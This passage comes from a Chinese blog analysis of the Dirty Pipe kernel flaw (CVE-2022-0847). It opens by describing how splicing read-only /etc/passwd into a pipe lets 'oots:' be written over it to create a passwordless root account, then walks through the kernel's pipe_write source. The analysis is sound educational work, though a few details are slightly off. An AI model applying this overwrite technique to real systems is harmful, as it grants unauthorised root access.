的页的首地址中，我第二次写的时候会写在哪里呢？两个选择，一个是紧跟着后面去写，第二个是在后一页去写，显然为了内存考虑我们大部分会选择紧跟着后面去写，因为总共 16 页，不可能我扔了 16 个字符进管道管道直接就满了。所以我们设置了一个 <code>flags</code> ，它们当中有一位就是标志了是否能在上面续写。</p><p>显然我一个一个往里面去丢字符，它肯定会把 16 个页都设置为可以续写，所以这一步就是把 <code>pipe</code> 缓冲区都设置为可续写。第二步我们打开了一个 <code>/etc/passwd</code> 文件，这个文件所有用户可读，只有 <code>root</code> 用户可写，我们以只读的方式打开它获得一个文件描述符，然后通过 <code>splice</code> 向管道中拷贝一个字节的内容。</p><p>这里的拷贝一个字节因为是零拷贝，所以它不是真正的拷贝，而是直接把缓存页给挂到了 <code>pipe</code> 缓冲区当中。然而此时 <code>Can Merge</code> 属性又存在，所以我们再往管道里写数据的时候，会因为 <code>Can Merge</code> 而直接写 <code>Page Cache</code> 绕过了权限检查。</p><p>于是我们向 <code>/etc/passwd</code> 的第二个字节起写上五个字节 <code>oots:</code>，这样的话 <code>/etc/passwd</code> 的第一行变成了 <code>roots::...</code>，原本第一行的内容为 <code>root:x:...</code>，中间的 <code>x</code> 表示此用户有密码，而我们把 <code>x</code> 取消掉了，那么我们生成了一个 uid 为 0 且没有密码的用户 <code>roots</code>，那么我们通过 <code>su roots</code> 就能直接切换到 <code>root</code> 权限。</p><img src="/2024/02/02/CVE-2022-0847/5.png" class=""><h2 id="内核源码分析"><a href="#内核源码分析" class="headerlink" title="内核源码分析"></a>内核源码分析</h2><h3 id="调试环境搭建"><a href="#调试环境搭建" class="headerlink" title="调试环境搭建"></a>调试环境搭建</h3><p>这段时间搭建 Kernel Pwn 环境，刚好有时间来做一下源码分析，首先选取对应的内核版本，这里我用了 5.13.19。</p><p>首先环境搭建好建议先用 exp 去试试看看漏洞是否存在，这里我使用exp，的确是存在的。</p><img src="/2024/02/02/CVE-2022-0847/6.png" class=""><p>那么我们就开始调试了。</p><hr><p>这里提一嘴，我们编译的时候不要勾选 <code>Reducing Debugging Information</code>，不然 vmlinux 将不含结构体信息，调试的难度会大大增加。</p><hr><h3 id="pipe源码分析"><a href="#pipe源码分析" class="headerlink" title="pipe源码分析"></a>pipe源码分析</h3><p>对于pipe来说，最重要的是读和写对应的调用，它们在内核层名为 <code>pipe_read</code> 和 <code>pip_write</code>，在 <code>/source/fs/pipe.c</code> 当中有完整的定义。</p><h4 id="pipe-write"><a href="#pipe-write" class="headerlink" title="pipe_write"></a>pipe_write</h4><p>我们先来看看 <code>pipe_write</code>。</p><p>函数完整的声明是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">pipe_write</span><span class="params">(<span class="keyword">struct</span> kiocb *iocb, <span class="keyword">struct</span> iov_iter *from)</span>;</span><br></pre></td></tr></table></figure><p>我们一段一段来分析。</p><h5 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">pipe_write</span><span class="params">(<span class="keyword">struct</span> kiocb *iocb, <span class="keyword">struct</span> iov_iter *from)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span> =</span> iocb-&gt;ki_filp;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> filp-&gt;private_data;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> head;</span><br><span class="line">    <span class="type">ssize_t</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span> total_len = iov_iter_count(from);</span><br><span class="line">    <span class="type">ssize_t</span> chars;</span><br><span class="line">    <span class="type">bool</span> was_empty = <span class="literal">false</span>;</span><br><span class="line">    <span class="type">bool</span> wake_next_writer = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Null write succeeds. */</span></span><br><span class="line">    <span class="keyword">if</span> (unlikely(total_len == <span class="number">0</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一个分支是如果 <code>total_len==0</code> 则直接 <code>return 0</code>，就是如果没有可写的数据，那么直接返回 0。</p><p>而中间的一个函数调用 <code>iov_iter_count</code> 仅仅是取得 <code>iov_iter</code> 中的 <code>count</code> 属性作为返回值，<code>from</code> 望文生义可以理解为是数据从哪里来（<code>from</code>），如果来的数据个数为 0 那么直接结束这次调用。</p><h5 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">pipe_write</span><span class="params">(<span class="keyword">struct</span> kiocb *iocb, <span class="keyword">struct</span> iov_iter *from)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    __pipe_lock(pipe);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!pipe-&gt;readers) &#123;</span><br><span class="line">        send_sig(SIGPIPE, current, <span class="number">0</span>);</span><br><span class="line">        ret = -EPIPE;</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">    <span class="keyword">if</span> (pipe-&gt;watch_queue) &#123;</span><br><span class="line">        ret = -EXDEV;</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If it wasn&#x27;t empty we try to merge new data into</span></span><br><span class="line"><span class="comment"> * the last buffer.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * That naturally merges small writes, but it also</span></span><br><span class="line"><span class="comment"> * page-aligns the rest of the writes for large writes</span></span><br><span class="line"><span class="comment"> * spanning multiple pages.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    head = pipe-&gt;head;</span><br><span class="line">    was_empty = pipe_empty(head, pipe-&gt;tail);</span><br><span class="line">    chars = total_len &amp; (PAGE_SIZE<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> (chars &amp;&amp; !was_empty) &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="number">1</span>) &amp; mask];</span><br><span class="line">        <span class="type">int</span> offset = buf-&gt;offset + buf-&gt;len;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;</span><br><span class="line">            offset + chars &lt;= PAGE_SIZE) &#123;</span><br><span class="line">            ret = pipe_buf_confirm(pipe, buf);</span><br><span class="line">            <span class="keyword">if</span> (ret)</span><br><span class="line">                <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">            ret = copy_page_from_iter(buf-&gt;page, offset, chars, from);</span><br><span class="line">            <span class="keyword">if</span> (unlikely(ret &lt; chars)) &#123;</span><br><span class="line">                ret = -EFAULT;</span><br><span class="line">                <span class="keyword">goto</span> out;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            buf-&gt;len += ret;</span><br><span class="line">            <span class="keyword">if</span> (!iov_iter_count(from))</span><br><span class="line">                <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先给这个管道上锁，然后判断如果 pipe 对象的 <code>reader</code> 为 0，那么直接给进程发送一个 <code>SIGPIPE</code>，通过查阅资料可得，大部分情况下，该信号会在写一个关闭一个 <code>socket</code> 对象时得到，那么这里同理，可能该管道已经关闭，但是仍往里面写数据。</p><p>随后这里的注释提到，如果给出的数据非空，那么尝试将新的数据写入缓冲区。随后这里进行一个判断，这里需要解释这里做的一个运算 <code>chars = total_len &amp; (PAGE_SIZE-1);</code>，<code>PAGE_SIZE</code> 通常情况下来说大小是 <code>4096</code>，刚好是一个 2 的 12 次幂，那么再 -1 相当于就是二进制的 12 个 1，再用 &amp; 运算就是取得 <code>total_len</code> 最低的 12 位，如果管道非空（环形队列判非空仅仅是判 tail 和 head是否相等），且写入长度最低 12 位为 0（这个判断等价于写入的长度不为页的整数倍，可以理解为是 <code>total_len % PAGE_SIZE!=0</code>，但是取模运算挺浪费时间的所以转为位运算），那么执行这个分支。</p><p>在分支里面的运算中，先获取 <code>mask</code> 掩码，值为 <code>pipe-&gt;ring_size-1</code>，其实跟前面取掩码差不多的道理，通常这个值是 16，也就是环形缓冲区的大小，通过调试输出也可以得到</p><img src="/2024/02/02/CVE-2022-0847/7.png" class=""><p>随后取得环形缓冲区的头部的前一个（循环队列通常是取模，这里 <code>head&amp;mask</code> 同样等效于 <code>(head-1) % 16</code>，至于为什么 -1，则是为了取得头部的前一个管道，来判断一下该管道是否可续写 ）。这里可以大胆猜测是在头部（head）写，尾部（tail）读。随后又进行一个判断 <code>buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE</code> 是很常见的取标记位，可以理解为缓冲区 <code>PIPE_BUF_FLAG_CAN_MERGE</code> 设置为 1，这里其实就是前面讲的，判断缓冲区是否可续写，后面的再跟一个判断 <code>offset + chars &lt;= PAGE_SIZE</code>，这里也很好理解，chars 我们前面说了就是我本次写入长度对页大小的余数（除去这个长度，其余部分肯定是页大小的整数倍了），如果这个余数加上 <code>offset</code> 在 <code>PAGE_SIZE</code> 之内，简单点讲，就是该页可以续写，且余数部分写入该页不会造成溢出，则执行后面的分支。</p><p>那么紧接着一步，先判断 <code>pipe_buf_confirm</code>，这个函数的定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * pipe_buf_confirm - verify contents of the pipe buffer</span></span><br><span class="line"><span class="comment"> * @pipe:the pipe that the buffer belongs to</span></span><br><span class="line"><span class="comment"> * @buf:the buffer to confirm</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">pipe_buf_confirm</span><span class="params">(<span class="keyword">struct</span> pipe_inode_info *pipe,</span></span><br><span class="line"><span class="params">                                   <span class="keyword">struct</span> pipe_buffer *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!buf-&gt;ops-&gt;confirm)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> buf-&gt;ops-&gt;confirm(pipe, buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以直接看给的注释，就是验证管道缓冲区的内容，这里向下再找一层找到这个成员函数 <code>confirm</code> 的定义说明</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* -&gt;confirm() verifies that the data in the pipe buffer is there</span></span><br><span class="line"><span class="comment">* and that the contents are good. If the pages in the pipe belong</span></span><br><span class="line"><span class="comment">* to a file system, we may need to wait for IO completion in this</span></span><br><span class="line"><span class="comment">* hook. Returns 0 for good, or a negative error value in case of</span></span><br><span class="line"><span class="comment">* error.  If not present all pages are considered good.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> (*confirm)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br></pre></td></tr></table></figure><p>判断缓冲区的内容是否为 good，如果为 0 则是 good，其实我也没想到它内容能怎么检查，可能检查是否错误，不过通常来说这个错误不会发生。</p><p>随后会执行 <code>copy_page_from_iter(buf-&gt;page, offset, chars, from);</code>，这一部分其实还是比较明显的，就是把数据的余数部分拷贝到缓冲区内，追加到 offset 之后，因为缓冲区里原本还有 offset 的数据。</p><p>通常来讲，拷贝了那么多，返回值一定也是那么多，随后校验返回值是否正确，然后给缓冲区长度加上拷贝的字节数。随后再提取要写的字节数，这里 <code>copy_page_from_iter</code> 肯定是会把 from 对象的 count 进行相应的减少的，所以如果后面没有数据了，那么直接结束就可以了。</p><h5 id="第三部分"><a href="#第三部分" class="headerlink" title="第三部分"></a>第三部分</h5><p>这一部分是一个很大的 for 循环，我们来看一下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">pipe_write</span><span class="params">(<span class="keyword">struct</span> kiocb *iocb, <span class="keyword">struct</span> iov_iter *from)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!pipe-&gt;readers) &#123;</span><br><span class="line">            send_sig(SIGPIPE, current, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> (!ret)</span><br><span class="line">                ret = -EPIPE;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        head = pipe-&gt;head;</span><br><span class="line">        <span class="keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> pipe-&gt;tmp_page;</span><br><span class="line">            <span class="type">int</span> copied;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!page) &#123;</span><br><span class="line">                page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);</span><br><span class="line">                <span class="keyword">if</span> (unlikely(!page)) &#123;</span><br><span class="line">                    ret = ret ? : -ENOMEM;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                pipe-&gt;tmp_page = page;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* Allocate a slot in the ring in advance and attach an</span></span><br><span class="line"><span class="comment">             * empty buffer.  If we fault or otherwise fail to use</span></span><br><span class="line"><span class="comment">             * it, either the reader will consume it or it&#x27;ll still</span></span><br><span class="line"><span class="comment">             * be there for the next write.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line"></span><br><span class="line">            head = pipe-&gt;head;</span><br><span class="line">            <span class="keyword">if</span> (pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;</span><br><span class="line">                spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            pipe-&gt;head = head + <span class="number">1</span>;</span><br><span class="line">            spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* Insert it into the buffer array */</span></span><br><span class="line">            buf = &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class="line">            buf-&gt;page = page;</span><br><span class="line">            buf-&gt;ops = &amp;anon_pipe_buf_ops;</span><br><span class="line">            buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">            buf-&gt;len = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (is_packetized(filp))</span><br><span class="line">                buf-&gt;flags = PIPE_BUF_FLAG_PACKET;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                buf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;</span><br><span class="line">            pipe-&gt;tmp_page = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">            copied = copy_page_from_iter(page, <span class="number">0</span>, PAGE_SIZE, from);</span><br><span class="line">            <span class="keyword">if</span> (unlikely(copied &lt; PAGE_SIZE &amp;&amp; iov_iter_count(from))) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!ret)</span><br><span class="line">                    ret = -EFAULT;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            ret += copied;</span><br><span class="line">            buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">            buf-&gt;len = copied;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!iov_iter_count(from))</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage))</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Wait for buffer space to become available. */</span></span><br><span class="line">        <span class="keyword">if</span> (filp-&gt;f_flags &amp; O_NONBLOCK) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!ret)</span><br><span class="line">                ret = -EAGAIN;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (signal_pending(current)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!ret)</span><br><span class="line">                ret = -ERESTARTSYS;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * We&#x27;re going to release the pipe lock and wait for more</span></span><br><span class="line"><span class="comment">        * space. We wake up any readers if necessary, and then</span></span><br><span class="line"><span class="comment">        * after waiting we need to re-check whether the pipe</span></span><br><span class="line"><span class="comment">        * become empty while we dropped the lock.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        __pipe_unlock(pipe);</span><br><span class="line">        <span class="keyword">if</span> (was_empty)</span><br><span class="line">            wake_up_interruptible_sync_poll(&amp;pipe-&gt;rd_wait, EPOLLIN | EPOLLRDNORM);</span><br><span class="line">        kill_fasync(&amp;pipe-&gt;fasync_readers, SIGIO, POLL_IN);</span><br><span class="line">        wait_event_interruptible_exclusive(pipe-&gt;wr_wait, pipe_writable(pipe));</span><br><span class="line">        __pipe_lock(pipe);</span><br><span class="line">        was_empty = pipe_empty(pipe-&gt;head, pipe-&gt;tail);</span><br><span class="line">        wake_next_writer = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先判断 reader 是否有效。随后判管道是否慢，不满则向下执行，其实判满的条件仅仅是 <code>head-pipe-&gt;tail&gt;=pipe-&gt;max_usage</code> 。其实这里的 <code>max_usage</code> 大概率也是常量 16，验证一下，果然如此。</p><img src="/2024/02/02/CVE-2022-0847/8.png" class=""><p>其实这里也不是很明白为什么一样的常量要用两个代替，客观来说，这两者意思是差不多的。然后分析一下如果不满的情况，先分配一个临时页。随后 <code>spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);</code> 上读的锁 <code>spin_lock_irq</code> 的宏定义其实就是上锁，可以再源码中找到。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> spin_lock_irq(x)pthread_mutex_lock(x)</span></span><br></pre></td></tr></table></figure><p>意思其实就是写的时候不能读，防止调度问题读在写之前发生了。</p><p>随后判断，如果管道满，那么解锁直接下次循环，如果管道不满，则 head 向前，将分配的页面插入到这个缓冲区内，并初始化这个缓冲区（len和offset都置零）。</p><p>is_packetized 应该是判断这个是否为网络数据包，如果是则设置标志位，否则设置标志位为可续写。用完这个页之后，把临时页指针置空防止被重复用到。随后拷贝一个页从 from 过来，后面当然也是判断拷贝的字节是否为一个页的大小。随后该缓冲区的 offset 置零，len 置为页的大小。如果没有要拷贝的数据了，则直接退出。</p><p>如果管道不满则继续如上流程，否则判断，如果管道设置为不能阻塞（O_NONBLOCK），则直接返回错误，否则挂起当前进程，等待数据被读走有空间。</p><p>随后释放管道的锁，允许其他线程或进程访问管道。如果在锁被释放之前管道为空，唤醒等待读取的进程。这通过调用 <code>wake_up_interruptible_sync_poll</code> 函数实现。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define wake_up_interruptible_sync_poll(x, m)\</span><br><span class="line">__wake_up_sync_key((x), TASK_INTERRUPTIBLE, poll_to_key(m))</span><br></pre></td></tr></table></figure><p>接下来向管道的异步读取进程发送 <code>SIGIO</code> 信号，通知它们有新的数据可用。<code>wait_event_interruptible_exclusive(pipe-&gt;wr_wait, pipe_writable(pipe));</code> 用于判断管道是否可写，否则阻塞在这里，然后重新获取管道的锁，标记下一个写入者需要唤醒。</p><p>这就是这一段代码的所有操作。</p><h5 id="最后一部分"><a href="#最后一部分" class="headerlink" title="最后一部分"></a>最后一部分</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">pipe_write</span><span class="params">(<span class="keyword">struct</span> kiocb *iocb, <span class="keyword">struct</span> iov_iter *from)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">out:</span><br><span class="line">    <span class="keyword">if</span> (pipe_full(pipe-&gt;head, pipe-&gt;tail, pipe-&gt;max_usage))</span><br><span class="line">        wake_next_writer = <span class="literal">false</span>;</span><br><span class="line">    __pipe_unlock(pipe);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * If we do do a wakeup event, we do a &#x27;sync&#x27; wakeup, because we</span></span><br><span class="line"><span class="comment">    * want the reader to start processing things asap, rather than</span></span><br><span class="line"><span class="comment">    * leave the data pending.</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * This is particularly important for small writes, because of</span></span><br><span class="line"><span class="comment">    * how (for example) the GNU make jobserver uses small writes to</span></span><br><span class="line"><span class="comment">    * wake up pending jobs</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * Epoll nonsensically wants a wakeup whether the pipe</span></span><br><span class="line"><span class="comment">    * was already empty or not.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> (was_empty || pipe-&gt;poll_usage)</span><br><span class="line">        wake_up_interruptible_sync_poll(&amp;pipe-&gt;rd_wait, EPOLLIN | EPOLLRDNORM);</span><br><span class="line">    kill_fasync(&amp;pipe-&gt;fasync_readers, SIGIO, POLL_IN);</span><br><span class="line">    <span class="keyword">if</span> (wake_next_writer)</span><br><span class="line">        wake_up_interruptible_sync_poll(&amp;pipe-&gt;wr_wait, EPOLLOUT | EPOLLWRNORM);</span><br><span class="line">    <span class="keyword">if</span> (ret &gt; <span class="number">0</span> &amp;&amp; sb_start_write_trylock(file_inode(filp)-&gt;i_sb)) &#123;</span><br><span class="line">        <span class="type">int</span> err = file_update_time(filp);</span><br><span class="line">        <span class="keyword">if</span> (err)</span><br><span class="line">            ret = err;</span><br><span class="line">        sb_end_write(file_inode(filp)-&gt;i_sb);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果管道满，下一个写者不需要唤醒（因为唤醒了也是阻塞）随后释放锁。后面一段代码跟前面for的后面差不多，主要有一个更新文件的操作，先获取文件写锁，然后再更新文件的时间戳，最后释放该锁。</p><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>整个管道写的代码就分析的差不多了，小结一下流程。</p><ol><li>若管道不为空且写入的数据长度不为 PAGE_SIZE的整数倍，那么尝试续写。</li><li>否则将数据按页拷贝到管道上面，期间可能会挂起进程等待读者取数据。</li><li>最后更新管道写的文件。</li></ol><p>可能会有一个疑问，那就是如果管道为空且长度不为 PAGE_SIZE 整数倍那么它按页拷贝会不会导致拷贝不出 PAGE_SIZE 